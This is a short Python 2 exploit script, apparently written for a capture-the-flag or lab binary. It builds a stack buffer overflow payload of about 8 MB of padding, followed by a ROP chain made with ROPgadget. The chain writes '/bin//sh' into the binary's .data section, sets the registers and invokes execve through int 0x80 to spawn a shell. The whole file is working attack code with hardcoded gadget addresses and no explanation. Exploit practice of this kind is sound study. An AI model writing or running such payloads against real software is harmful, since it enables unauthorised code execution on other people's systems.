#!/usr/bin/env python2
# execve generated by ROPgadget
from struct import pack

# Padding goes here
# First, the buffer overflow.
p =  "S"*0x7fb75c
p += "AAAA"
#p = ""

p += pack('<I', 0x0807627a) # pop edx ; ret
p += pack('<I', 0x080f9060) # @ .data
p += pack('<I', 0x080c22f6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x08073506) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080f9068) # @ .data + 8
p += pack('<I', 0x0807627a) # pop edx ; ret
p += pack('<I', 0x080f9064) # @ .data + 4
p += pack('<I', 0x080c22f6) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08073506) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080f9068) # @ .data + 8
p += pack('<I', 0x0807627a) # pop edx ; ret
p += pack('<I', 0x080f9068) # @ .data + 8
p += pack('<I', 0x08057b40) # xor eax, eax ; ret
p += pack('<I', 0x08073506) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080f9060) # @ .data
p += pack('<I', 0x080ef9a3) # pop ecx ; ret
p += pack('<I', 0x080f9068) # @ .data + 8
p += pack('<I', 0x0807627a) # pop edx ; ret
p += pack('<I', 0x080f9068) # @ .data + 8
p += pack('<I', 0x08057b40) # xor eax, eax ; ret
p += pack('<I', 0x08082d66) # inc eax ; ret
p += pack('<I', 0x08082d66) # inc eax ; ret
p += pack('<I', 0x08082d66) # inc eax ; ret
p += pack('<I', 0x08082d66) # inc eax ; ret
p += pack('<I', 0x08082d66) # inc eax ; ret
p += pack('<I', 0x08082d66) # inc eax ; ret
p += pack('<I', 0x08082d66) # inc eax ; ret
p += pack('<I', 0x08082d66) # inc eax ; ret
p += pack('<I', 0x08082d66) # inc eax ; ret
p += pack('<I', 0x08082d66) # inc eax ; ret
p += pack('<I', 0x08082d66) # inc eax ; ret
p += pack('<I', 0x0804ae81) # int 0x80


print p